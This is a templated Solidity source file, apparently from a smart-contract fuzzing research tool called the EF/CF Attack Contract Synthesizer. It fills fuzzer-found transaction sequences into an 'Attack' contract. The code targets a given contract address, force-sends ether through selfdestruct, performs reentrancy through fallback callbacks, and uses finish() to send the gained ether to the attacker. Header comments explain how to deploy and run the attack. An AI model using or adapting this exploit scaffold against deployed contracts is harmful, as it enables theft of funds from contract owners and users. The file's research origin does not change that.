/*
 * Single-Attacker Exploit Generated by EF/CF Attack Contract Synthesizer
 *
 * Deploy the `Attack` contract with the target address as the constructor
 * parameter. Make sure to send at least {{required_budget|wei_to_ether}} to the attack
 * contract along with the constructor.
 *
 * To execute the attack, call the `attack()` method. Calling `attack` might
 * emit the `WaitForBlocks(N)` event. In this case you should call the
 * `attack()` method again after `N` blocks have passed.
 *
 * To start the attack again, you can use `reset(new_target_addr)` to reset the
 * attack contract. If you pass in `address(0)` the old target address will be
 * used.
 *
 * To claim the Ether gained with the attack, issue a call to `finish()`, which
 * will destroy all attack contracts and send all funds back to you.
 *
 * The original test case was executed with the following environment:
 * block number: +{{ header.get_number() }}
 * timestamp: +{{ header.get_timestamp() }}
 * gas limit: {{ header.get_gas_limit() }}
 * difficulty: {{ header.get_difficulty() }}
 * initial balance: {{ header.get_initial_ether()|from_call_value }} wei
 *
 */

pragma solidity ^0.7;

/*****************************************************/
contract ForceSender {
    function send(address payable target) external payable {
        selfdestruct(target);
    }
    receive() external payable {}
}
/*****************************************************/

contract Attack {

    event AttackProgress(uint state, uint depth);
    event AttackFinished();
    
    event CallReturned(uint state, address target, address who, bool success, bytes retdata);
    event CallbackReceived(uint state, address who, address caller, uint value, bytes data);
    event Calling(uint state, address target, address from, uint value, bytes data);
    event Returning(uint state, uint rstate, address target, address from, bool success, bytes data);

    uint constant REQUIRED_BUDGET = {{required_budget|as_hex}}; /* equals {{required_budget|wei_to_ether }} */
    address constant ORIGINAL_ADDRESS = {{ original_addr|as_address }};

    uint state = 0;  // state to manage which TX to send; monotonically increasing
    uint last_execed_state = 0; // points to the right state after reentrancy
    mapping(uint => uint) rstate; // sub-state to manage different return-data
    uint depth = 0;
    uint budget = 0;

    address payable owner;
    address payable target;

    constructor(address payable _target) payable {
        require(_target != address(0));
        target = _target;
        owner = msg.sender;
        reset(address(0));
    }

    modifier onlyOwner {
        require(owner != address(0));
        require(msg.sender == owner);
        _;
    }

    function attack() public onlyOwner payable {
        {%- if header.initial_ether > 0 %}
        if (state == 0) {
            ForceSender f = new ForceSender();
            uint value = {{ header.get_initial_ether()|from_call_value }};
            f.send{value: value}(target);
        }
        {%- endif %}
        // call dispatch until end of state machine.
        while (state < {{ fc.txs.len() }}) {
            last_execed_state = state;
            _dispatch();
        }
        emit AttackFinished();
    }

    function reset(address new_target) internal {
        state = 0;
        {%- for call in fc.txs %}
        rstate[{{ loop.index0 }}] = 0;
        {%- endfor %}
        if (new_target != address(0)) {
            target = payable(new_target);
        }
        budget = address(this).balance;
        require(budget >= REQUIRED_BUDGET);
    }

    function finish() public onlyOwner {
        selfdestruct(owner);
    }
    
    function finishTo(address payable to) public onlyOwner {
        selfdestruct(to);
    }

    fallback() external payable {
        _fallback();
    }
    receive() external payable {
        _fallback();
    }

    function _fallback() internal {
        emit CallbackReceived(state, address(this), msg.sender, msg.value, msg.data);
        {%- for call in fc.txs %}
        {%- if loop.first %}
        if (last_execed_state == {{ loop.index0 }}) {
        {%- else %}
        else if (last_execed_state == {{ loop.index0 }}) {
        {%- endif %}
            {%- for ret in call.returns %}
            {%- if loop.first %}
            if (rstate[last_execed_state] == {{ loop.index0 }}) {
            {%- else %}
            else if (rstate[last_execed_state] == {{ loop.index0 }}) {
            {%- endif %}
                uint cur_state = state; // save state on current stack
                {%- if ret.header.reenter > 0 %}
                depth += 1;
                {%- if ret.header.reenter == 1 %}
                _dispatch();
                {%- else %}
                for (uint i = 0; i < {{ ret.header.reenter }}; i++) {
                    _dispatch();
                }
                {%- endif %}
                depth -= 1;
                {%- endif %}
                last_execed_state = cur_state; // set locally saved state
                rstate[last_execed_state] += 1;
                bytes memory retdata = {{ ret.data|to_bytes_addrfixup_single }};
                uint retdata_len = {{ ret.data.len() }};
                emit Returning(last_execed_state, rstate[last_execed_state], msg.sender,
                               address(this), {{ ret.header.value > 0 }}, retdata);
                {%- if ret.header.value == 0 %}
                assembly { revert(retdata, retdata_len) }
                {%- else %}
                assembly { return(retdata, retdata_len) }
                {%- endif %}
            }
            {%- endfor %}
        }
        {%- endfor %}
    }

    function _dispatch() internal returns(bool) {
        emit AttackProgress(state, depth);
        {%- for call in fc.txs %}
        {%- if loop.first %}
        if (state == {{ loop.index0 }}) {
        {%- else %}
        else if (state == {{ loop.index0 }}) {
        {%- endif %}
            {%- let ba = call.header.block_advance %}
            {%- if ba > 0 %}
            /* WARNING: Call should advance blockchain state:
             * block number += {{ ba }}
             * timestamp += {{ ba|advance_to_time }}
             */
            {%- endif %}
            {%- if contractinfo.is_some() %}
            /* {{- call.input|abi_format(contractinfo)|indent(14) }} 
             */
            {%- endif %}
            bytes memory data = {{ call.input|to_bytes_addrfixup_single }};
            uint value = {{ call.header.get_packed_call_value()|from_call_value }};
            emit Calling(state, target, address(this), value, data);
            (bool success, bytes memory returned) = target.call{ value: value }(data);
            emit CallReturned(state, target, address(this), success, returned);
            state += 1;
            return true;
        }
        {%- endfor %}
        return false;
    }
}
